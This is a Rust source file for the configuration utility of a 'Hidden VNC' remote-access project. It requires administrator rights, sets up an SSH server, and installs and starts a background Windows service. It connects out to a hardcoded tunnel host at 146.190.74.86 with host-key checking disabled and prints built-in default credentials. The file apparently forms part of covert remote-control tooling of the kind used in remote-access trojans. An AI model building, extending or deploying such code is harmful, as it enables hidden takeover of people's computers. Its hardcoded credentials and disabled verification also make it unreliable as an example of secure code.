//! Hidden VNC Server Configuration Tool
//! 
//! This tool helps configure the server with the provided credentials
//! and sets up the connection to tunneluser@146.190.74.86

use hidden_vnc::{
    host::{HvncService, ServiceConfig, ServiceControl, service::ServiceStatus, SshSetup},
    common::{get_default_connection_info, DEFAULT_SERVER},
    Result, HvncError,
};
use log::{info, error, warn};
use clap::{Arg, Command};
use std::io::{self, Write};
use std::process;

fn main() -> Result<()> {
    // Parse command line arguments
    let matches = Command::new("hvnc-server-config")
        .version("0.1.0")
        .author("Hidden VNC Team")
        .about("Hidden VNC Server Configuration Tool")
        .arg(
            Arg::new("auto")
                .long("auto")
                .help("Auto-configure with default credentials")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("install")
                .long("install")
                .help("Install and configure service")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("test")
                .long("test")
                .help("Test connection to configured server")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("verbose")
                .short('v')
                .long("verbose")
                .help("Enable verbose logging")
                .action(clap::ArgAction::SetTrue)
        )
        .get_matches();

    // Initialize logging
    let log_level = if matches.get_flag("verbose") { "debug" } else { "info" };
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(log_level)).init();

    println!("=== Hidden VNC Server Configuration Tool ===");
    println!();

    if matches.get_flag("auto") {
        return auto_configure();
    }

    if matches.get_flag("install") {
        return install_and_configure();
    }

    if matches.get_flag("test") {
        return test_connection();
    }

    // Interactive configuration
    interactive_configuration()
}

/// Auto-configure with default credentials
fn auto_configure() -> Result<()> {
    println!("🔧 Auto-configuring server with default credentials...");
    println!();

    // Display default server information
    println!("Default Server Configuration:");
    println!("  Host: {}", DEFAULT_SERVER.host);
    println!("  Username: {}", DEFAULT_SERVER.username);
    println!("  Password: {}", DEFAULT_SERVER.password);
    println!("  SSH Port: {}", DEFAULT_SERVER.ssh_port);
    println!();

    // Check if running as administrator
    if !is_administrator() {
        eprintln!("❌ Error: Administrator privileges required for server configuration.");
        eprintln!("Please run this tool as Administrator.");
        process::exit(1);
    }

    // Setup SSH server automatically
    println!("📡 Setting up SSH server...");
    let mut ssh_setup = SshSetup::new();
    
    match ssh_setup.auto_setup() {
        Ok(ssh_info) => {
            println!("✅ SSH server configured successfully!");
            println!();
            ssh_info.display_connection_info();
        }
        Err(e) => {
            eprintln!("❌ SSH setup failed: {}", e);
            return Err(e);
        }
    }

    // Test connection to default server
    println!("🔍 Testing connection to default server...");
    match test_ssh_connection() {
        Ok(()) => {
            println!("✅ Connection test successful!");
            println!("Server is ready to accept HVNC connections.");
        }
        Err(e) => {
            warn!("⚠️  Connection test failed: {}", e);
            println!("This may be normal if the server is not yet configured.");
        }
    }

    println!();
    println!("🎉 Auto-configuration complete!");
    println!("You can now use the GUI client to connect to this server.");

    Ok(())
}

/// Install service and configure
fn install_and_configure() -> Result<()> {
    println!("🚀 Installing and configuring Hidden VNC service...");
    println!();

    // Check if running as administrator
    if !is_administrator() {
        eprintln!("❌ Error: Administrator privileges required for service installation.");
        eprintln!("Please run this tool as Administrator.");
        process::exit(1);
    }

    // First configure the server
    auto_configure()?;

    println!();
    println!("📦 Installing Windows service...");

    // Install service
    match HvncService::install_service() {
        Ok(()) => {
            println!("✅ Service installed successfully!");
            
            // Check service status
            match ServiceControl::get_service_status() {
                Ok(ServiceStatus::Running) => {
                    println!("✅ Service is running and ready for connections.");
                }
                Ok(status) => {
                    println!("ℹ️  Service status: {:?}", status);
                    
                    // Try to start if stopped
                    if status == ServiceStatus::Stopped {
                        println!("🔄 Starting service...");
                        match ServiceControl::start_service() {
                            Ok(()) => println!("✅ Service started successfully!"),
                            Err(e) => warn!("⚠️  Failed to start service: {}", e),
                        }
                    }
                }
                Err(e) => {
                    warn!("⚠️  Could not check service status: {}", e);
                }
            }
        }
        Err(e) => {
            eprintln!("❌ Service installation failed: {}", e);
            return Err(e);
        }
    }

    println!();
    println!("🎉 Installation and configuration complete!");
    println!("The Hidden VNC service is now running in the background.");
    println!("Use the GUI client to connect and launch applications.");

    Ok(())
}

/// Test connection to configured server
fn test_connection() -> Result<()> {
    println!("🔍 Testing connection to configured server...");
    println!();

    let connection_info = get_default_connection_info();
    
    println!("Testing connection to:");
    println!("  Host: {}", connection_info.host);
    println!("  Username: {}", connection_info.username);
    println!("  SSH Port: {}", connection_info.ssh_port);
    println!();

    match test_ssh_connection() {
        Ok(()) => {
            println!("✅ Connection test successful!");
            println!("The server is reachable and SSH is working.");
            
            // Test HVNC service if installed
            match ServiceControl::get_service_status() {
                Ok(ServiceStatus::Running) => {
                    println!("✅ HVNC service is running.");
                }
                Ok(status) => {
                    println!("ℹ️  HVNC service status: {:?}", status);
                }
                Err(_) => {
                    println!("ℹ️  HVNC service not installed or not accessible.");
                }
            }
        }
        Err(e) => {
            eprintln!("❌ Connection test failed: {}", e);
            println!();
            println!("Troubleshooting tips:");
            println!("1. Check if the server is online and reachable");
            println!("2. Verify SSH credentials are correct");
            println!("3. Ensure SSH server is running on the target host");
            println!("4. Check firewall settings");
            return Err(e);
        }
    }

    Ok(())
}

/// Interactive configuration
fn interactive_configuration() -> Result<()> {
    println!("🔧 Interactive Server Configuration");
    println!();

    println!("This tool will help you configure the Hidden VNC server.");
    println!("Current default server: {}@{}", DEFAULT_SERVER.username, DEFAULT_SERVER.host);
    println!();

    println!("Configuration options:");
    println!("1. Auto-configure with default credentials");
    println!("2. Install service and configure");
    println!("3. Test connection to server");
    println!("4. Manual SSH setup");
    println!("5. View current configuration");
    println!("6. Exit");
    println!();

    loop {
        print!("Select option (1-6): ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        let choice = input.trim();

        match choice {
            "1" => {
                println!();
                return auto_configure();
            }
            "2" => {
                println!();
                return install_and_configure();
            }
            "3" => {
                println!();
                return test_connection();
            }
            "4" => {
                println!();
                return manual_ssh_setup();
            }
            "5" => {
                println!();
                show_current_configuration();
            }
            "6" => {
                println!("Goodbye!");
                break;
            }
            _ => {
                println!("Invalid option. Please try again.");
            }
        }
    }

    Ok(())
}

/// Manual SSH setup
fn manual_ssh_setup() -> Result<()> {
    println!("🔧 Manual SSH Setup");
    println!();

    if !is_administrator() {
        eprintln!("❌ Error: Administrator privileges required for SSH setup.");
        eprintln!("Please run this tool as Administrator.");
        process::exit(1);
    }

    println!("This will set up SSH server on this machine for HVNC connections.");
    print!("Continue? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    
    if input.trim().to_lowercase() != "y" {
        println!("Setup cancelled.");
        return Ok(());
    }

    // Setup SSH
    println!();
    println!("📡 Setting up SSH server...");
    let mut ssh_setup = SshSetup::new();
    
    match ssh_setup.auto_setup() {
        Ok(ssh_info) => {
            println!("✅ SSH server setup complete!");
            println!();
            ssh_info.display_connection_info();
            
            // Save connection info
            ssh_info.save_to_file("hvnc_connection_info.txt")?;
            println!("Connection information saved to: hvnc_connection_info.txt");
        }
        Err(e) => {
            eprintln!("❌ SSH setup failed: {}", e);
            return Err(e);
        }
    }

    Ok(())
}

/// Show current configuration
fn show_current_configuration() {
    println!("📋 Current Configuration");
    println!();

    // Default server info
    println!("Default Server:");
    println!("  Host: {}", DEFAULT_SERVER.host);
    println!("  Username: {}", DEFAULT_SERVER.username);
    println!("  Password: {}", DEFAULT_SERVER.password);
    println!("  SSH Port: {}", DEFAULT_SERVER.ssh_port);
    println!("  HVNC Port: {}", DEFAULT_SERVER.hvnc_port);
    println!("  Tunnel Port: {}", DEFAULT_SERVER.tunnel_port);
    println!();

    // Service status
    match ServiceControl::get_service_status() {
        Ok(status) => {
            println!("Service Status: {:?}", status);
        }
        Err(_) => {
            println!("Service Status: Not accessible or not installed");
        }
    }

    // Check if connection info file exists
    if std::path::Path::new("hvnc_connection_info.txt").exists() {
        println!("Connection Info File: ✅ Present (hvnc_connection_info.txt)");
    } else {
        println!("Connection Info File: ❌ Not found");
    }

    println!();
}

/// Test SSH connection to default server
fn test_ssh_connection() -> Result<()> {
    use std::process::Command;

    let connection_info = get_default_connection_info();

    let output = Command::new("ssh")
        .args(&[
            "-o", "ConnectTimeout=10",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            &format!("{}@{}", connection_info.username, connection_info.host),
            "echo", "HVNC_TEST_SUCCESS"
        ])
        .output()
        .map_err(|e| HvncError::OperationFailed(format!("SSH test command failed: {}", e)))?;

    if output.status.success() {
        let output_str = String::from_utf8_lossy(&output.stdout);
        if output_str.contains("HVNC_TEST_SUCCESS") {
            Ok(())
        } else {
            Err(HvncError::OperationFailed("SSH connection succeeded but test command failed".to_string()))
        }
    } else {
        let error_str = String::from_utf8_lossy(&output.stderr);
        Err(HvncError::ConnectionRefused(format!("SSH connection failed: {}", error_str)))
    }
}

/// Check if running as administrator (Windows)
fn is_administrator() -> bool {
    #[cfg(windows)]
    {
        use std::ptr;
        use winapi::um::processthreadsapi::GetCurrentProcess;
        use winapi::um::securitybaseapi::GetTokenInformation;
        use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
        use winapi::um::handleapi::CloseHandle;

        unsafe {
            let mut token = ptr::null_mut();
            if winapi::um::processthreadsapi::OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_QUERY,
                &mut token,
            ) == 0 {
                return false;
            }

            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut size = 0;
            let result = GetTokenInformation(
                token,
                TokenElevation,
                &mut elevation as *mut _ as *mut _,
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut size,
            );

            CloseHandle(token);

            result != 0 && elevation.TokenIsElevated != 0
        }
    }
    
    #[cfg(not(windows))]
    {
        // On non-Windows systems, assume we have the necessary privileges
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_configuration_display() {
        // Test that configuration display doesn't panic
        show_current_configuration();
    }
}